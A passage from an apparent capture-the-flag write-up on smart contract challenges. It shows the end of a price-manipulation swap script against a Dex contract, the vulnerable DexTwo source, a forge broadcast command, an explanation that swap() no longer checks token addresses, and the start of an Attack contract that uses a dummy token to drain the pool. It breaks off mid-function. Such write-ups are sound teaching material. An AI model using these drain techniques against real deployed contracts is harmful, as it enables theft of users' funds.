<span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>dex</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>max</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">,</span><span> token2</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">,</span><span> token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">20</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">,</span><span> token2</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">24</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">,</span><span> token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">30</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">,</span><span> token2</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">41</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        dex</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">,</span><span> token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">45</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level22Solution.s.sol:Level22Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Dex Two</h2>
<p><strong>Level23.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;openzeppelin-contracts/contracts/access/Ownable.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">DexTwo</span><span> </span><span class="token" style="color:#569CD6">is</span><span> </span><span class="token" style="color:#dcdcaa">Ownable</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> token1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> token2</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTokens</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _token2</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    token1 </span><span class="token" style="color:#d4d4d4">=</span><span> _token1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    token2 </span><span class="token" style="color:#d4d4d4">=</span><span> _token2</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">add_liquidity</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> token_address</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token_address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> amount</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not enough to swap&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> swapAmount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">getSwapAmount</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getSwapAmount</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span>amount </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">/</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">SwappableTokenTwo</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">SwappableTokenTwo</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> token</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> account</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>account</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">SwappableTokenTwo</span><span> </span><span class="token" style="color:#569CD6">is</span><span> ERC20 </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">private</span><span> _dex</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> dexInstance</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> name</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> symbol</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span>name</span><span class="token" style="color:#d4d4d4">,</span><span> symbol</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        _dex </span><span class="token" style="color:#d4d4d4">=</span><span> dexInstance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>owner </span><span class="token" style="color:#d4d4d4">!=</span><span> _dex</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;InvalidApprover&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    super</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">_approve</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Observe that the <code>DexTwo</code> modifies the <code>swap()</code> function from the <code>Dex</code>. It removed the check of valid tokens.</li>
<li>So, we are now allowed to input any token addresses to the swap() function.</li>
<li>I created two Dummy Tokens and transferred 100 tokens each of the two tokens to the <code>Dex</code> address.</li>
<li>I swapped my Dummy tokens with the <code>token1</code> and <code>token2</code> balances of the <code>Dex</code> contract.</li>
</ol>
<p><strong>Level23Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>DexTwo</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level23.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level23Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    DexTwo </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">DexTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x9635173E4b119f8f3f459eAa61a75Ba75d759A63</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> token1 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> token2 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    DexTwo </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">DexTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x9635173E4b119f8f3f459eAa61a75Ba75d759A63</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#ce9178">address</span><span> token1 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> token2 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">token2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    Dummy dummyToken1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        dummyToken1 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Dummy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
